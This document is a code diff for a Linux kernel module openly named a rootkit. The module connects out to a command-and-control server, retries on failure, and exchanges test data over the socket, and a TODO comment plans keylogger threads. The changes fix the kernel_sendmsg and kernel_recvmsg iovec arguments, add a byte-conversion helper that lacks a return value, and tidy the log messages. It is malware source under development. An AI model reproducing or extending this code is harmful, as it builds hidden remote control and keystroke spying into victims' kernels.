@@ -19,7 +19,7 @@ struct socket *sock = NULL;
 static int CALLBACK_INTERVAL = 30;
 static int MAXIMUM_ATTEMPTS = 5;
 static enum data_operation {
-  SEND = 1, 
+  SEND = 1,
   RECV = 2
 };
 
@@ -32,6 +32,13 @@ static uint8_t* encrypt(const uint8_t* msg, unsigned int msg_len, const uint8_t*
   }
 
   return encrypted;
+}
+
+static int to_bytes(int num, uint8_t *ptr) {
+  int i;
+  for (i = 0; i < 4; i++) {
+    ptr[i] = (num >> (24 - (i * 8))) & 0xFF;
+  }
 }
 
 static int do_data_transfer(char * buffer, size_t length, int operation) {
@@ -48,9 +55,9 @@ static int do_data_transfer(char * buffer, size_t length, int operation) {
   vec.iov_base = buffer;
 
   if (operation == SEND ){
-    return kernel_sendmsg(sock, &msg, &vec, vec.iov_len, vec.iov_len);
+    return kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
   } else if (operation == RECV) {
-    return kernel_recvmsg(sock, &msg, &vec, vec.iov_len, vec.iov_len, 0);
+    return kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
   } else {
     return -1;
   }
@@ -65,25 +72,21 @@ static int __init rootkit_init(void) {
   addr.sin_addr.s_addr = in_aton(C2_IP); 
   addr.sin_port = htons(C2_PORT);
 
-  printk(KERN_INFO "Loaded kernel module");
+  printk(KERN_INFO "Loaded kernel module\n");
   /*TODO: kick off keylogger threads
-   *
-   */
-
-  /*TODO: Kick off callback loop
    *
    */
 
   while (!shutdown) {
     int attempts = 0;
-    printk(KERN_INFO "Creating socket");
+    printk(KERN_INFO "Creating socket\n");
     if (!sock && (retval = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0) {
-      printk(KERN_INFO "Failed to create socket, uninstalling now");
+      printk(KERN_INFO "Failed to create socket, uninstalling now\n");
       goto uninstall;
     }
 
     // attempt to connect to socket, uninstall if attempts exceed MAXIMUM_ATTEMPTS
-    printk(KERN_INFO "Attempting to connect to C2");
+    printk(KERN_INFO "Attempting to connect to C2\n");
     while (0 != (retval = sock->ops->connect(sock, (struct sockaddr*) &addr, sizeof(addr), O_RDWR))) { 
       printk("connection with the server failed with error code %i...\n", retval); 
       ssleep(10);
@@ -93,16 +96,16 @@ static int __init rootkit_init(void) {
       }
     }
     attempts = 0;
-    printk(KERN_INFO "Connection established!");
+    printk(KERN_INFO "Connection established!\n");
 
     char data[3] = {0x41, 0x42, 0x00};
-    printk("SIZE SENT: %i", do_data_transfer(data, 3, SEND));
+    printk("SIZE SENT: %i\n", do_data_transfer(data, 3, SEND));
 
-    printk("SIZE RECV: %i", do_data_transfer(data, 3, RECV));
-    printk("MSG RECV: %s", data);
+    printk("SIZE RECV: %i\n", do_data_transfer(data, 3, RECV));
+    printk("MSG RECV: %s\n", data);
 
     // cleanup current connection
-    printk(KERN_INFO "Destroying socket");
+    printk(KERN_INFO "Destroying socket\n");
     sock_release(sock);
     sock = NULL;
 
@@ -115,7 +118,7 @@ uninstall:
 }
 
 static void __exit rootkit_exit(void) {
-  printk(KERN_INFO "Removed kernel module");
+  printk(KERN_INFO "Removed kernel module\n");
 }
 
 module_init(rootkit_init);
